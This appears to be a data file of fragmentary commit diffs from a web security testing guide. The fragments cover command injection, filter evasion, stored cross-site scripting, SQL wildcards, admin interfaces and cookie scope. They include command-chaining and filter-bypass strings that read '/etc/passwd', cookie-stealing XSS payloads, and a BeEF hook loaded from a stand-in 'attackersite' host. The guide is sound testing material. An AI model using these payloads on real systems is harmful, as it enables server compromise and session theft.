+- CATS /admin/groupEdit.php?group=Admins&member=myAdmin&action=add

+
+Most SQL dialects support both single-character wildcards (usually ""`?`"" or ""`_`"") and multi-character wildcards (usually ""`%`"" or ""`*`""), which can be used in queries with the `LIKE` operator. Even when appropriate controls (such as parameters or prepared statements) are used to protect against SQL injection attacks, it may be possible to inject wildcards into queries.
+
+For example, if a web application allows users to enter a discount code as part of the checkout process, and it checks whether this code exists in the database using a query such as `SELECT * FROM discount_codes WHERE code LIKE ':code'`, then entering a value of `%` would match all of the discount codes.
+
+This technique could also be used to determine exact discount codes through increasingly specific queries, such as `a%`, `b%`, `ba%`, etc).

0b78e0a5dd39e3bf3822adb0cb1c796a293fe717,Update 12-Testing_for_Command_Injection.md (#1243),"+OS command injection is a vulnerability that occurs when user input is directly passed to an operating system command without proper validation or sanitization. This allows the user to inject and execute arbitrary commands on the server which can lead to unauthorized data access, data corruption, and full server compromise. This vulnerability can be prevented by emphasizing security during the design and development of applications.
+- Identify and assess command injection points.
+- Bypass special characters and OS commands filter.
+Consider the case of an application that contains a set of documents that you can browse from the internet. If you fire up a personal proxy (such as ZAP or Burp Suite), you can obtain a POST HTTP like the following (`https://www.example.com/public/doc`):
+Special characters are used to chain multiple commands together.
+These characters will vary based on the operating system running on the web server.
+For instance, the following types of command chaining can be used on both Windows and Unix-based systems :
+- `cmd1|cmd2` : cmd2 will be executed whether cmd1 succeeds or not.
+- `cmd1||cmd2` : cmd2 will only be executed if cmd1 fails.
+- `cmd1&&cmd2` : cmd2 will only be executed if cmd1 succeeds.
+- `cmd1&cmd2` : cmd2 will be executed whether cmd1 succeeds or not.  
+
+Note that, `;` will work on Unix-based systems and PowerShell. However, it will not work on Windows Command Prompt (CMD).  
+Furthermore, you can use Bash command substitution `$(cmd)` or &grave;`cmd`&grave; to execute commands on Unix-based systems.  
+Additionally, Linux file descriptors such as `>(cmd)`, `<(cmd)` can also be used.
+
+## Filter Evasion
+
+To prevent OS command injection, web developers often use filters. However, these filters are sometimes not properly implemented which allows attackers to bypass them.
+In this section, we will cover different techniques used to bypass those filters.
+
+### Methodology
+
+First of all, it is always good practice to have a basic understanding of how the filter works before trying to bypass it.
+Here is a methodology we can use when we come across a filter:
+
+- Is the filter client-side or server-side ?
+- Is the filter applied on special characters, OS commands, or both ?
+- Is the webapp using a allowlist or blocklist filter ?
+- What OS is running on the web server? This allows us to have an idea of the commands and special characters we can use.
+
+### Special Characters Filter Evasion
+
+As previously mentionned, filters can either be applied on special characters, OS commands or both.
+To bypass filters applied on special characters, we can use environment variables, Bash brace expansion or URL encoding.
+
+#### URL Encoding
+
+URL encoding special characters can allow us to bypass the filter if the web server only blocks the plaintext special characters.
+Here are some special characters with their URL encoded format:
+
+|Special Character|URL Encoding|
+|-----------------|------------|
+|;                | %3b        |
+|space            | %20        |
+|tab              | %09        |
+|&                | %26        |
+|New line         | %0a        |
+
+For instance, instead of using `;whoami`, we could use `%3bwhoami`.
+
+#### Environment Variables
+
+Special characters like space, semi-colon, tab, or new line will generally be filtered by the web server especially if they are not useful for the specified input.  
+To escape this restriction, we can use environment variables such as **IFS**, **PATH** or **LS_COLORS** on Linux, and **HOMEPATH** on Windows.  
+For instance, on Linux, `/`, `;`, and `[space]` can be replaced respectively with `${PATH:0:1}`, `${LS_COLORS:10:1}`, and `${IFS}`.  
+On Windows CMD, we can replace `\` with `%HOMEPATH:~6,1%`, or use `$env:HOMEPATH[0]` in PowerShell.
+
+#### Bash Brace Expansion
+
+Bash brace expansion is a Bash feature that allows you to execute commands by using curly braces.  
+For example, `{ls,-la}` will execute `ls -la` command. This can be extremely useful if the web server is filtering space, new line, or tab characters.  
+Let's assume that we want to display the content of '/etc/passwd' file. Thus, instead of using `;cat /etc/passwd`, we can use `;{cat,/etc/passwd}`.
+That said, it's important to note that this technique will only work if the web server is using Bash and if characters like `}{/,;` are not filtered.
+
+### Commands Filter Evasion
+
+In this section, we are going to explore some techniques used to bypass filters applied on operating system commands.
+
+#### Case Modification
+
+Case modification is a technique that is used to bypass OS command filters. This will be helpful if the server-side filter is case sensitive.  
+For instance, if we notice during our testing that the web server is blocking `;whoami`, we can try to use instead `;WhoAmi`, and see that the server-side filter is only blocking lowercase commands, we will be able to bypass it.  
+Note that this technique will generally",1,Security Knowledge

Tests should be undertaken to reveal if and how this privileged functionality can be accessed by an unauthorized or standard user.
+### Black Box Testing
+The following section describes vectors that may be used to test for the presence of administrative interfaces. These techniques may also be used to test for related issues including privilege escalation, and are described elsewhere in this guide (for example, [Testing for bypassing authorization schema](../05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema.md) and [Testing for Insecure Direct Object References](../05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References.md)) in greater detail.
+- Directory and file enumeration: An administrative interface may be present but not visibly available to the tester. The path of the administrative interface may be guessed by simple requests such as /admin or /administrator. In some scenarios, these paths can be revealed within seconds using advanced Google search techniques - [Google dorks](https://www.exploit-db.com/google-hacking-database). There are many tools available to perform brute forcing of server contents, see the tools section below for more information. A tester may have to also identify the filename of the administration page. Forcibly browsing to the identified page may provide access to the interface.
+- Comments and links in source code: Many sites use common code that is loaded for all site users. By examining all source sent to the client, links to administrator functionality may be discovered and should be investigated.
+- Reviewing server and application documentation: If the application server or application is deployed in its default configuration it may be possible to access the administration interface using information described in configuration or help documentation. Default password lists should be consulted if an administrative interface is found and credentials are required.
+- Publicly available information: Many applications, such as WordPress, have administrative interfaces that are available by default.
+- Alternative server port: Administration interfaces may be seen on a different port on the host than the main application. For example, Apache Tomcat's Administration interface can often be seen on port 8080.
+- Parameter tampering: A GET or POST parameter, or a cookie may be required to enable the administrator functionality. Clues to this include the presence of hidden fields such as:
+Once an administrative interface has been discovered, a combination of the above techniques may be used to attempt to bypass authentication. If this fails, the tester may wish to attempt a brute force attack. In such an instance, the tester should be aware of the potential for administrative account lockout if such functionality is present.
+### Gray Box Testing
+Source code should be reviewed to ensure that the authorization and authentication model ensures clear separation of duties between normal users and site administrators. User interface functions shared between normal and administrator users should be reviewed to ensure clear separation between the rendering of such components and the information leakage from such shared functionality.
+Each web framework may have its own default admin pages or paths, as in the following examples:
+Several tools can assist in identifying hidden administrator interfaces and functionality, including:

2e97929f6f1507eb6b3f6e45deabf22d53026b9d,4.8.2 - v4 Migration Cleanup,"+# Testing for Stored Cross Site Scripting
+## Summary
+
+Stored [Cross-site Scripting (XSS)](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)) is the most dangerous type of Cross Site Scripting. Web applications that allow users to store data are potentially exposed to this type of attack. This chapter illustrates examples of stored cross site scripting injection and related exploitation scenarios.
+- Hijacking another user's browser
+- Capturing sensitive information viewed by application users
+- Pseudo defacement of the application
+- Port scanning of internal hosts (“internal” in relation to the users of the web application)
+- Directed delivery of browser-based exploits
+- Other malicious activities
+- Attacker stores malicious code into the vulnerable page
+- User authenticates in the application
+- User visits vulnerable page
+- Malicious code is executed by the user's browser
+This type of attack can also be exploited with browser exploitation frameworks such as [BeEF](http://www.beefproject.com) and [XSS Proxy](http://xss-proxy.sourceforge.net/). These frameworks allow for complex JavaScript exploit development.
+## How to Test
+### Black Box Testing
+The process for identifying stored XSS vulnerabilities is similar to the process described during the [testing for reflected XSS](4.8.1_Testing_for_Reflected_Cross_Site_Scripting_OTG-INPVAL-001.md).
+#### Input Forms
+- User/Profiles page: the application allows the user to edit/change profile details such as first name, last name, nickname, avatar, picture, address, etc.
+- Shopping cart: the application allows the user to store items into the shopping cart which can then be reviewed later
+- File Manager: application that allows upload of files
+- Application settings/preferences: application that allows the user to set preferences
+- Forum/Message board: application that permits exchange of posts among users
+- Blog: if the blog application permits to users submitting comments
+- Log: if the application stores some users input into logs.
+#### Analyze HTML Code
+**Note**: All areas of the application accessible by administrators should be tested to identify the presence of any data submitted by users.
+**Example**: Email stored data in index2.php
+![Stored Input Example](images/Stored_input_example.jpg)\
+*Figure 4.8.2-1:Stored Input Example*
+```html
+<input class=""inputbox"" type=""text"" name=""email"" size=""40"" value=""aaa@aa.com"" />
+```
+In this case, the tester needs to find a way to inject code outside the `<input>` tag as below:
+```html
+<input class=""inputbox"" type=""text"" name=""email"" size=""40"" value=""aaa@aa.com""> MALICIOUS CODE <!-- />
+```
+#### Testing for Stored XSS
+- `aaa@aa.com&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;`
+- `aaa@aa.com%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E`
+Ensure the input is submitted through the application. This normally involves disabling JavaScript if client-side security controls are implemented or modifying the HTTP request with a web proxy such as [WebScarab](https://www.owasp.org/index.php/OWASP_WebScarab_Project). It is also important to test the same injection with both HTTP GET and POST requests. The above injection results in a popup window containing the cookie values.
+> ![Stored XSS Exxample](images/Stored_xss_example.jpg)\
+> *Figure 4.8.2-2:Stored Input Example*
+>
+> The HTML code following the injection:
+>
+> ```html
+> <input class=""inputbox"" type=""text"" name=""email"" size=""40"" value=""aaa@aa.com""><script>alert(document.cookie)</script>
+> ```
+>
+> The input is stored and the XSS payload is executed by the browser when reloading the page. If the input is escaped by the application, testers should test the application for XSS filters. For instance, if the string “SCRIPT” is replaced by a space or by a NULL character then this could be a potential sign of XSS filtering in action. Many techniques exist in order to evade input filters (see [testing for reflected XSS](4.8.1_Testing_for_Reflected_Cross_Site_Scripting_OTG-INPVAL-001.md)) chapter). It is strongly recommended that testers refer to [XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet) and [Mario](https://cybersecurity.wtf/encoder/) XSS Cheat pages, which provide an extensive list of XSS attacks and filtering bypasses. Refer to the whitepapers and tools section for more detailed information.
+#### Leverage Stored XSS with BeEF
+Stored XSS can be exploited by advanced JavaScript exploitation frameworks such as [BeEF](http://www.beefproject.com) and [XSS Proxy](http://xss-proxy.sourceforge.net/).
+- Injecting a JavaScript hook which communicates to the attacker's browser exploitation framework (BeEF)
+- Waiting for the application user to view the vulnerable page where the stored input is displayed
+- Control the application user’s browser via the BeEF console
+**Example**: BeEF Injection in index2.php:
+`aaa@aa.com”><script src=http://attackersite/hook.js></script>`

The password represents the keys to the kingdom, but is often subverted by users in the name of usability.

+### Gray-Box Testing
+Applications should be developed with mechanisms to only accept and manipulate “acceptable“ files that the rest of the application functionality is ready to handle and expecting. Some specific examples include: blacklisting or whitelisting of file extensions, using “Content-Type” from the header, or using a file type recognizer, all to only allow specified file types into the system.
+# Test Upload of Malicious Files
+While safeguards such as blacklisting or whitelisting of file extensions, using “Content-Type” from the header, or using a file type recognizer may not always be protections against this type of vulnerability. Every application that accepts files from users must have a mechanism to verify that the uploaded file does not contain malicious code. Uploaded files should never be stored where the users or attackers can directly access them.
+### Black-Box Testing
+### Gray-Box Testing
+Gray-box testing is similar to black-box testing. In gray-box testing, the pen-tester has partial knowledge of the application. The only difference here is that you may have API documentation for the application being tested which includes the expected WebSocket request and responses.

For example, the developer could help in understanding how to formulate a correct SOAP request that the application would accept and where the web service resides (if the web service or any other function hasn't already been identified during the black-box testing).
+In black-box testing it is extremely difficult to test the entire code base. Not just because the tester has no view of the code paths through the application, but even if they did, to test all code paths would be very time consuming. One way to reconcile this is to document what code paths were discovered and tested.
+### Black-Box Testing
+### Gray-Box or White-Box Testing
+Ensuring sufficient code coverage for the application owner is far easier with gray-box and white-box approach to testing. Information solicited by and provided to the tester will ensure the minimum requirements for code coverage are met.

+Performing white-box testing against file extensions handling amounts to checking the configurations of web servers or application servers taking part in the web application architecture, and verifying how they are instructed to serve different file extensions.

+### Gray-Box Testing
+In black-box testing, the tester knows nothing about the specific application, username, application logic, error messages on log in page, or password recovery facilities. If the application is vulnerable, the tester receives a response message that reveals, directly or indirectly, some information useful for enumerating users.
+### Gray-Box Testing
+Verify that the application answers in the same manner for every client request that produces a failed authentication. For this issue the black-box testing and gray-box testing have the same concept based on the analysis of messages or error codes received from web application.
+### Black-Box Testing
+### Gray-Box Testing
+In black-box testing the tester knows nothing about the application and its underlying infrastructure. In reality this is often not true, and some information about the application is known. We suppose that you have identified, through the use of the techniques described in this Testing Guide under the chapter [Information Gathering](../4.2_Information_Gathering/4.2_Testing_Information_Gathering.md), at least one or more common applications that may contain accessible administrative interfaces.
+#### Gray-Box Testing
+The following steps rely on an entirely gray-box approach. If only some of this information is available to you, refer to black-box testing to fill the gaps.
+- Examine the user database for default credentials as described in the black-box testing section. Also check for empty password fields.

a23877f75dfbe2383a0444f67f8eee420319dcfc,Update scenario with no domain attribute (#1001),"+For example, if a cookie is set by an application at `app.mydomain.com` with no domain attribute set, then the cookie would be resubmitted for all subsequent requests for `app.mydomain.com`, but not its subdomains (such as `hacker.app.mydomain.com`), or to `otherapp.mydomain.com`. (However, older versions of Edge/IE behave differently, and _do_ send these cookies to subdomains.) If a developer wanted to loosen this restriction, then they could set the `domain` attribute to `mydomain.com`. In this case the cookie would be sent to all requests for `app.mydomain.com` and `mydomain.com` subdomains, such as `hacker.app.mydomain.com`, and even `bank.mydomain.com`. If there was a vulnerable server on a subdomain (for example, `otherapp.mydomain.com`) and the `domain` attribute has been set too loosely (for example, `mydomain.com`), then the vulnerable server could be used to harvest cookies (such as session tokens) across the full scope of `mydomain.com`.
